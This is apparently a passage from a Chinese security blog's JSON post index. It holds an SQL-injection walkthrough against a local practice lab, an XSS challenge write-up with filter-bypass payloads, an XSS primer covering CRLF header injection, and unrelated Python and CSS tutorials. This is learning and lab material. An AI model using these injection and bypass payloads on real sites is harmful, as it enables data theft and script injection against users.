table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了group_cancat()函数：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit 然后我们继续去查列名，然后转到infromation_schema的columns下，一直搜索account下滑发现，我们在这个列表下可以拿到更全的信息： 去对比下account表下的列名信息：是相对应的，所以我们可以更改下语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿news测试下获取列名：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chumen77.xyz/tags/SQL/"}]},{"title":"XSS挑战之旅","slug":"XSS挑战之旅","date":"2019-08-20T12:29:45.000Z","updated":"2020-02-28T07:54:30.000Z","comments":true,"path":"2019/08/20/XSS挑战之旅/","link":"","permalink":"http://chumen77.xyz/2019/08/20/XSS挑战之旅/","excerpt":"","text":"XSS挑战之旅关卡第一关payload:&lt;script&gt;alert(1)&lt;/script&gt;此题没有任何过滤，直接构造语句，在标签之间进行输出。 第二关此题变成了&lt;input&gt;标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;， 或者也可以payload：&quot; onclick=alert(1)&gt;这个需要点击搜索后，再点击搜索框，属于借助js事件类型。 第三关变成了单引号的input标签，先尝试闭合input标签这个思路。发现没有过去，去看下网页代码。发现其过滤了&lt; &gt;,这样只能通过js事件来构造弹窗。跟上题一样，不过此处是单引号，所以构造payload：&#39; onclick=&#39;alert(1)注意此处的alert(1)的前面还有个单引号，其效果就是value=&#39;&#39; onclick=&#39;alert(1)&#39; 第四关查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：&quot; onclick=&quot;alert(1) 第五关看网页源代码，跟上题一样，直接先测试上题的payload。&lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看&lt; &gt;是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;然后点击就ok了。 第六关第六关直接测试上题的payload，无法通过，然后看网页源代码：&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;发现href遭到了过滤，结果发现改变大小写可以绕过。payload：&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; 第七关还是先测试上题的payload，然后查看源代码，发现：href与script直接被替换成了空，然后考虑双写绕过，构造payload：&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; 第八关发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。会发现这个题是在这个地方来进行xss攻击。先构造payload：javascript:alert(1)，无法通过，然后查看源代码&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。构造payload：javasc&amp;#114;ipt:alert(1) 第九关这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，http://www.baidu.com,发现显示正常了，经过测试后发现其在检测到http://后才会正常显示你的代码。所以构造payload：javasc&amp;#114;ipt:alert(1)//http://注意”//“这个是来注释后面的代码的。 第十关进来以后发现无任何可输入的地方，然后就查看源代码 发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到type=”***“，即可把原来的type给替换所以考虑构造payload：&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()然后会出现个输入框，点击后即可过关。此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个name=&quot;t_sort&quot;才会出现文本框，所以构造了以最后一个标签为攻击点的payload。 第十一关至第十三关这几关都是http头注入需要抓包来完成，基本大差不差的。第十一关 Referer第十二关 ua 第十三关 cookie明显是cookie注入了 第十四至最后这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。 绕过姿势小补充“()”被过滤用” ` “ 字符了来代替括号。 payload: alert`1` 小进阶 “ ` “ “()”同时被过滤可以使用 &lt;svg&gt; 标签，其有一个特性就是可以执行HTML实体代码。用法是&lt;svg&gt;&amp;#数字;所以构造payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"XSS知识简单学习","slug":"xss学习","date":"2019-08-16T08:21:01.000Z","updated":"2020-02-28T07:54:44.000Z","comments":true,"path":"2019/08/16/xss学习/","link":"","permalink":"http://chumen77.xyz/2019/08/16/xss学习/","excerpt":"","text":"XSS知识简单学习一:Xss简介XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 二：ajax简介ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。 三：xss漏洞分类存储XSS存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。 用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 反射型XSS攻击反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。 其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。 Dom-xss通过URL传入参数所触发，其不与服务器进行通信，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。 四：X-XSS-Protection是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。筒単一句活:`header(“X-XSS-Protection: 0”);告泝浏览器禁用XSS保枦header(“X-XSS-Protection: 1”);告泝浏览器幵宕XSS保枦` 五：CRLF响应头注入Location: http://****%0d%0aX-XSS-Protection: 0就是相当于`Location: http://****XSS-Protection: 0`这就是一个注入，又添加了一个响应头。但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。应用场景： php&lt;5.1 碰到了服务器开启xss拦截 六：修补xss漏洞（简单）过滤例如 &gt; &lt; Script等等字眼 转义利用php函数 htmlentities()把字符转换为HTML实体 七：闭合xss当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是&#39;&quot;&gt;&lt;/textarea&gt;+js代码 即可。","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"简易解决python2.X与python3.x共存问题","slug":"简易解决python2.X与python3.x共存问题","date":"2019-04-02T15:05:47.000Z","updated":"2020-02-28T07:54:57.000Z","comments":true,"path":"2019/04/02/简易解决python2.X与python3.x共存问题/","link":"","permalink":"http://chumen77.xyz/2019/04/02/简易解决python2.X与python3.x共存问题/","excerpt":"","text":"简易解决python2.X与python3.x共存问题python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。 安装模块Python目前还是需要分开安装 py -2 -m pip install xxxx py -3 -m pip install xxxx 运行脚本分别用py2.x py3.x运行一个1.py的脚本： py -2 1.py py -3 1.py 或者在1.py的文件代码头加上#! python3 #! python2看个人的情况。 这样就直接输入： py 1.py 这只是解决了简单的安装模块和运行脚本的问题。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"css学习","slug":"css学习","date":"2019-03-30T14:48:12.000Z","updated":"2020-02-28T07:55:03.000Z","comments":true,"path":"2019/03/30/css学习/","link":"","permalink":"http://chumen77.xyz/2019/03/30/css学习/","excerpt":"","text":"CSS如何使用CSSCSS可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用”style” 属性 (不推荐使用)； 内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt;元素 来包含CSS。 外部引用 - 使用外部 CSS 文件(==推荐使用)== 内联样式应用到个别元素时，就可以使用内联样式。 &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; 内部样式表当单个文件需要特别样式时，就可以使用内部样式表。你可以在&lt;head&gt; 部分通过 &lt;style&gt;标签定义内部样式表:。也推荐这样使用便于更改全局。 &lt;head&gt; &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; &lt;/head&gt; 注：在头文件写的时候 style还是个开闭标签。 外部样式表用&lt;link&gt;当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。 &lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; 其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址； 练习：&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css三种引入方式&lt;/title&gt; &lt;!-- &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"1.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; --&gt; &lt;div&gt; 苹果1&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;!-- 1.css --&gt; 效果： CSS 语法CSS 语法规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是您需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。 CSS声明总是以分号(;)结束，声明组以大括号({})括起来 例：h1{ color:blue; font-size :12px;} 其中h1 为选择器 color 是属性 blue是值。 CSS 注释：CSS注释以 “/*“ 开始, 以 “*/“ 结束。 颜色：颜色属性被用来设置文字的颜色。 颜色是通过CSS最经常的指定： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) 颜色的名称 - 如: red 常用的：rgb：：r是红色，g是绿色，b是蓝色。 body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; /* 可以写成 #0f0 */ h2 &#123;color:rgb(255,0,0);&#125; /* 0-255 */ 是其颜色深浅 ==注 - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。== CSS选择器基本选择器： id 选择器：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。（==ID属性不要以数字开头==） class 选择器：class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 例：&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; 。class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点“.”号显示 *通配符：全部标签属性的都会有效果。 标签 div：div标签 的会有效果。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=\"txt\"&gt;the way i am&lt;/p&gt; &lt;p class=\"txt1 txt2\"&gt;song&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; css： div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; #txt&#123; color: #1f1; &#125; .txt1 &#123; font-size: 10px; &#125; .txt2 &#123; color: #ff2; &#125; 效果： CSS原理优先原则优先原则：后解析的内容，会覆盖掉原来解析的内容。 1:同一个选择器:从上往下执行。 例： div&#123; color: red; color: green; &#125;/*最终是为绿色*/ 2:同一类型的选择器：从上往下执行 例： div&#123; background: yellow; &#125; div&#123; background: red; &#125;/*最终是为红色*/ .bg1&#123; background: yellow; &#125; .bg2&#123; background: blue; &#125;/*最终是为蓝色*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; 在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue。 3：不同类型的选择器：看优先级 先解析低级的在解析高级的：* &lt; div &lt; class &lt; id div&#123; color: red； &#125; .bg1&#123; color: yellow; &#125; /*最终是为黄色*/ 4：多重样式优先级 样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。 一般情况下，优先级如下： 内联样式 &gt; 内部样式 &gt;外部样式 ==（谁优先级越高越最后解析）== 对于全部都是 当加上!important 这个选择器的内容就会最后进行。 继承原则==对于嵌套标签，子级继承父级。== 文字 文本 样式可以继承，其他的不能。 块级元素 没有设置的时候，会继承父级的宽，而高度则是看其内容长短。 CSS组成选择器分组选择器直接上代码了： div&#123; background: green; color: red; &#125; p&#123; background: green; color: red; font-size: 50px; &#125; div,p&#123; background: green; color: red; &#125; p&#123; font-size: 50px; &#125; 把div 与 p 里面相同的部分放到一个里面就行了。 嵌套选择器div p&#123; background: green; color: red; font-size: 50px; &#125; &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt; 只要在其父或父的以上级有div，那这个p里的东西就能生效。 效果： 子选择器这个和以上很类似，区别在只在其父为div时，才能生效。 div&gt;p&#123; background: green; color: red; font-size: 50px; &#125; 类比以上就是只有p2有css效果 同级选择器div+p&#123; background: green; color: red; font-size: 50px; &#125; 在平级的p才可以生效，对比以上，也就是p1是有css效果。 属性选择器p[title=cc]&#123; background: green; color: red; font-size: 50px; &#125; &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=\"cc 1\"&gt;p1&lt;/p&gt; &lt;/body&gt; 基本标签==+== [属性=值]：p3出现css效果。 [属性~=值]：p1 p3出现css效果。 注意：代码中cc 1需要空格隔开，不隔没有效果。 [属性^=值]：开头有cc的字符就行cc1. p1 p3 出现cc效果。 [属性$=值]：类比^= 是结束。 伪元素选择器每个我自己写出来的元素都会有伪元素。、 例： &lt;p title=\"cc\"&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; 直接上代码： p::before&#123; content: \"before\" &#125; p::after&#123; content: \"after\" &#125; 效果： 块元素： 第一个字母：first-letter 第一行：first-line p::first-letter&#123; color: red; font-size: 100px; &#125; 这些写就是会是p内内容第一个字符大写。 也可以为 &lt;p title=\"cc\"&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS 背景CSS 背景属性用于定义HTML元素的背景。 背景颜色background-color 属性定义了元素的背景颜色. 页面的背景颜色使用在body的选择器中: body {background-color:red;} 背景图像background-image属性描述了元素的背景图像. 默认情况下，背景图像进行平铺重复显示. body {background-image:url(&#39;1.png&#39;);} 背景图像 - 相关设置 水平或垂直平铺： body &#123; background-image:url('gradient2.png'); background-repeat:repeat-x; &#125; 里面repeat-x是x轴，repeat-y是y轴。 不平铺：background-repeat:no-repeat 定位： ​ background-position:50% 0% 这使其在x轴的中心， ​ x： left center right； ​ y: top center bottom； css字体css字体 字体系列：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。 例：font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;; 字体样式:font-style:italic;斜体 字体大小：font-size 属性设置文本的大小。font-size:40px; font-weight: 设置其粗细。font-weight: normal lighter blod; 练习： body &#123; font-family: \"黑体\",\"宋体\"; font-style:italic; font-size:80px; font-weight: bold; &#125; /*5.css */ &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文字-字体&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"5.css\"&gt; &lt;/head&gt; &lt;body&gt; 这是一段字 &lt;br&gt; hello world! &lt;/body&gt; &lt;/html&gt; CSS - 文本文本属性集合 color属性用于设置文本的颜色 direction属性用于设置文本方向。 letter-spacing属性用于在组成单词的字母之间添加或减去空格。 text-indent属性用于缩进段落的文本。 text-align属性用于对齐文档的文本。 text-decoration属性用于下划线，上划线和删除文本。 text-transform属性用于大写文本或将文本转换为大写或小写字母。 white-space属性用于控制文本的流和格式。 text-shadow属性用于设置文本周围的文本阴影。 文本颜色： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) ==不推荐使用太多浏览器不支持== 颜色的名称 - 如: red body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; h2 &#123;color:rgb(255,0,0);&#125; 文本的对齐方式文本可居中或对齐到左或右,两端对齐. .a1&#123; text-align:right; &#125; .a2&#123; text-align:center; &#125; .a3&#123; text-align:left; &#125; &lt;body&gt; &lt;p class=\"a1\"&gt;这是一段字&lt;/p&gt; &lt;br&gt; &lt;p class=\"a2\"&gt;hello world!&lt;/p&gt; &lt;p class=\"a3\"&gt;hhhhaaaa&lt;/p&gt; &lt;/body&gt; 文本修饰装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。 .a1&#123; text-decoration:overline; &#125; .a2&#123; text-decoration:line-through; &#125; .a3&#123; text-decoration:underline; &#125; 文本缩进文本缩进属性是用来指定文本的第一行的缩进。 p {text-indent:50px;} 文本方向值是ltr或rtl。 .a&#123; direction:rtl; &#125; 文字就先写到这。 CSS 链接链接样式 a:link - 正常，未访问过的链接 a:visited - 用户已访问过的链接 a:hover - 当用户鼠标放在链接上时 a:active - 链接被点击的那一刻 a:link {color: red;} CSS列表常用的就是 ul&#123; list-style-type: none; list-style-type: disc; 实心圆 list-style-type: circle; 空心圆 list-style-type: square; 实心方格 &#125; 最常用就是 none 然后换成自己想弄成的图片。 ol 对应就是 lower-alpha upper-alpha lower-roman等等； 作为列表项标记的图像 ul &#123; list-style-image: url(''); &#125;","categories":[],"tags":[{"name":"css","slug":"css","permalink":"http://chumen77.xyz/tags/css/"}]}]}